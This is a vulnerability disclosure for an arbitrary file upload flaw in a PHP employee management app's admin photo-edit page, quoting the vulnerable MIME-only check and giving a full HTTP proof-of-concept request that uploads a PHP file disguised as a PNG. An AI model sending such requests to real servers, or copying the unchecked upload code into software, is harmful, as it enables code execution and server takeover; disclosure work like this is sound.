### Vulnerability file address

In line 18 of `Admin/edit-photo.php`, `$image_name= addslashes($_FILES['avatar']['name']);`, the file extension is not whitelisted. Following up to line 20, `move_uploaded_file($_FILES["avatar"]["tmp_name"],"../uploadImage/" . $_FILES["avatar"]["name"]);`, the file is uploaded to the `uploadImage/` directory.

```php
<?php
include('../inc/topbar.php');
if(empty($_SESSION['admin-username']))
    {
      header("Location: login.php");
    }

if(isset($_POST["btnsave"]))
{
$file_type = $_FILES['avatar']['type']; //returns the mimetype
$allowed = array("image/jpeg", "image/gif","image/jpeg", "image/webp","image/png");
if(!in_array($file_type, $allowed)) {
$error = 'Only jpeg,Webp, gif, and png files are allowed.';
 // exit();

}else{
$image= addslashes(file_get_contents($_FILES['avatar']['tmp_name']));
$image_name= addslashes($_FILES['avatar']['name']);
$image_size= getimagesize($_FILES['avatar']['tmp_name']);
move_uploaded_file($_FILES["avatar"]["tmp_name"],"../uploadImage/" . $_FILES["avatar"]["name"]);
$location="uploadImage/" . $_FILES["avatar"]["name"];
```

### POC

```html
POST /CMS/php/employee_akpoly/Admin/edit-photo.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------37409217622644975681930203783
Content-Length: 348
Origin: http://10.0.0.20:82
Connection: close
Referer: http://10.0.0.20:82/CMS/php/employee_akpoly/Admin/edit-photo.php
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1

-----------------------------37409217622644975681930203783
Content-Disposition: form-data; name="avatar"; filename="1.php"
Content-Type: image/png

<?php phpinfo(); ?>

-----------------------------37409217622644975681930203783
Content-Disposition: form-data; name="btnsave"


-----------------------------37409217622644975681930203783--

```

### Attack results pictures

![image-20250128150546197](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501281505244.png)



![image-20250128150630998](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501281506036.png)



